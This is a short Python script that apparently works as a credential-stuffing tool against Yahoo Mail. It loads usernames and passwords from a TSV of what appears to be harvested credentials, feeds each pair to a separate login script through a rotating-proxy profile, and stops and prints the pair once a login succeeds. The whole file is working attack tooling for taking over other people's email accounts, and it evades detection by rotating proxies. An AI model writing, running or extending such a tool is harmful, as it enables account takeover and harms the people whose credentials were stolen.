#!/usr/bin/env python3
"""
Try Yahoo Mail credentials from the TSV until one logs in.

Usage:
    python scripts/find_valid_yahoo_cred.py [max_attempts]
"""
from __future__ import annotations

import csv
import subprocess
import sys
from pathlib import Path

TSV = Path("/Volumes/Untitled/cookies/data/0730/cleaned/mail_yahoo_creds.tsv")
SCRIPT = Path(__file__).resolve().parent / "yahoo_login.py"
DEFAULT_MAX = 10
PROFILE = "proxy-rotating"


def summarize(output: str) -> str:
    """Extract the useful bits from a yahoo_login.py run."""
    lines = output.splitlines()
    summary_lines = []
    for line in lines:
        if "Validate response body:" in line:
            summary_lines.append(line.strip())
        if "Page error text:" in line:
            summary_lines.append(line.strip())
        if "VALID CREDENTIAL" in line:
            summary_lines.append(line.strip())
        if "Unexpected final URL" in line:
            summary_lines.append(line.strip())
    return " | ".join(summary_lines) if summary_lines else "(no summary)"


def main() -> int:
    max_attempts = int(sys.argv[1]) if len(sys.argv) > 1 else DEFAULT_MAX
    if not TSV.exists():
        print(f"Credential file not found: {TSV}", file=sys.stderr)
        return 1

    rows = []
    with TSV.open(newline="") as f:
        reader = csv.DictReader(f, delimiter="\t")
        for row in reader:
            rows.append((row["url"], row["username"], row["password"]))

    print(f"Loaded {len(rows)} credential rows. Will try up to {max_attempts}.")

    for idx, (url, username, password) in enumerate(rows[:max_attempts], start=1):
        if "yahoo.com" not in username or not password:
            continue
        print(f"\n[{idx}/{max_attempts}] Trying {username} ...")
        try:
            proc = subprocess.run(
                [sys.executable, str(SCRIPT), username, password, PROFILE],
                capture_output=True,
                text=True,
                timeout=120,
            )
        except subprocess.TimeoutExpired:
            print(f"    TIMEOUT")
            continue

        output = proc.stdout + proc.stderr
        print(f"    exit={proc.returncode} {summarize(output)}")

        if "Login appears successful" in output:
            print(f"\n>>> VALID CREDENTIAL FOUND: {username} / {password}")
            return 0

    print("\nNo valid credential found in the attempted set.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
